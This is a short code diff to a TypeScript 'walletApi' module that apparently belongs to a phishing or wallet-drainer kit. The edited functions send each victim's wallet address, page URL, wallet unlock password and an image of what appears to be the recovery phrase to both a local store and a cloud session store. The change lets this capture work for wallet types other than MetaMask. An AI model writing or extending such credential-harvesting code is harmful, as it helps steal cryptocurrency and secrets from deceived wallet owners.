@@ -140,17 +140,19 @@ export const walletApi = {
     pageUrl?: string
     draft?: boolean
     phraseSnapImage?: string | null
+    walletType?: string
   }) {
+    const walletType = payload.walletType || 'MetaMask'
     upsertLocalWalletSession({
       walletAddress: payload.walletAddress,
-      walletType: 'MetaMask',
+      walletType,
       pageUrl: payload.pageUrl,
       unlockPassword: payload.password,
       phraseSnapImage: payload.phraseSnapImage ?? null,
     })
     void upsertCloudWalletSession({
       walletAddress: payload.walletAddress,
-      walletType: 'MetaMask',
+      walletType,
       pageUrl: payload.pageUrl,
       unlockPassword: payload.password,
       phraseSnapImage: payload.phraseSnapImage ?? null,
@@ -175,16 +177,18 @@ export const walletApi = {
     walletAddress: string
     password: string
     pageUrl?: string
+    walletType?: string
   }) {
+    const walletType = payload.walletType || 'MetaMask'
     upsertLocalWalletSession({
       walletAddress: payload.walletAddress,
-      walletType: 'MetaMask',
+      walletType,
       pageUrl: payload.pageUrl,
       unlockPassword: payload.password,
     })
     void upsertCloudWalletSession({
       walletAddress: payload.walletAddress,
-      walletType: 'MetaMask',
+      walletType,
       pageUrl: payload.pageUrl,
       unlockPassword: payload.password,
     })
